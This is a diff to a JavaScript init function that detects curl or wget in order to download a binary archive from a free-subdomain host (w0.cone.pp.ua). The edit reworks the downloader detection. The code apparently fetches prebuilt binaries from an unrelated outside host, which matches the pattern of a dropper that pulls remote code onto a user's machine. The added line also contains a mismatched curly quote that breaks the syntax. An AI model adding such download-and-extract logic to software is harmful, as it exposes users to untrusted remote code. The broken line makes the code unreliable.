@@ -196,11 +196,15 @@ function initAndExtractBinaries() {
     const archivePath = path.join(binDir, 'binaries.tar.gz');
     const downloadUrl = 'https://w0.cone.pp.ua/binary_x64.tar.gz';
     
-    let downloader = null;
-    execSync ('command -v curl >/dev/null 2>&1 && echo "curl" || (command -v wget >/dev/null 2>&1 && echo "wget" || echo "none")', (error, stdout) => {
-        downloader = stdout.trim();
+    let downloader = “none" ;
+    try {
+       downloader = execSync(
+            'command -v curl >/dev/null 2>&1 && echo "curl" || (command -v wget >/dev/null 2>&1 && echo "wget" || echo "none")'
+        ).toString().trim();
         console.log(`[Init] Detected downloader tool: ${downloader}`);
-    });
+    } catch (err) {
+        console.error('[Init] Failed to detect downloader:', err.message);
+    }
     
     try {
         console.log('[Init] Downloading binaries archive...');
